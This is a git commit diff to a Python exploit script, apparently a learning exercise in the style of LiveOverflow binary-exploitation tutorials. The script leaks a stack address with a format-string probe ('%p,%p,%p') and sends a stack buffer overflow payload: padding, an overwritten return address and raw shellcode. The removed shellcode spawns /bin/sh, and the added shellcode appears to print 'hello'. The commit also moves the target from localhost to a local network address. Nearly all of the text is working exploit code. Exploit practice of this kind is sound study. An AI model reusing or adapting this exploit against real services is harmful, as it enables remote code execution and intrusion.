99a0c64490afdc2c3f3193f584ea5cc5376b2643
Lorenzo Ruotolo <ruotololorenzo@gmail.com>
2023-09-22 18:02:25 +0200

    minor changes

--- liveoverflow/asd.py
+++ liveoverflow/asd.py
@@ -4,7 +4,8 @@ import struct
 
 # socket creation
 s = socket.socket()
-s.connect(('127.0.0.1', 1337))
+s.connect(('192.168.178.242', 1337))
+#s.connect(('127.0.0.1', 1337))
 r = s.recv(1024)
 s.send("%p,%p,%p\n")
 while ',' not in r:
@@ -14,10 +15,12 @@ start_buf = int(r.split(',')[1], 16)-9 # compensate for offset
 print("leaked start of buffer: 0x{:08x}".format(start_buf))
 
 raw_input("EXPLOIT READY: PRESS ANY KEY TO START")
-padding = "shafhjaopfjdisapfujdwlafndkls;akfl'sdgfdsGf/dsgf'sdgkofpdskgfdsgjfdlkshgjfdlsghjfdklsjgkfajiwreorjawklbfjdb,fdklsgjkfds'glpfd\hlg'ndl'lser[toerp[sgifdjsvcxbnv.cxmb.vn,c/bvc,nlb'sop[rdigfod[spn gjklnvjflsgnfdsljgkfl;dfsjgfkd;slgjfdslgfjmnvmklhuqp89rpqhfslbndsnbmkpv"
-RIP = struct.pack("Q", start_buf+len(padding) + 8)  # 8 compensate for RIP
+padding = "B" * 257
+RIP = struct.pack("Q", start_buf + len(padding) + 8)  # 8 compensate for RIP
 # shellcode = "\xcc"*64
-shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
+
+shellcode = b"\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x06\x22\x79\x46\x0e\x31\x01\x20\x04\x27\x01\xdf\x24\x1b\x20\x1c\x01\x27\x01\xdf\x68\x65\x6c\x6c\x6f\x0a\x00\x00"
+#shellcode = b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"
 payload = padding + RIP + shellcode
 s.send(payload)
 
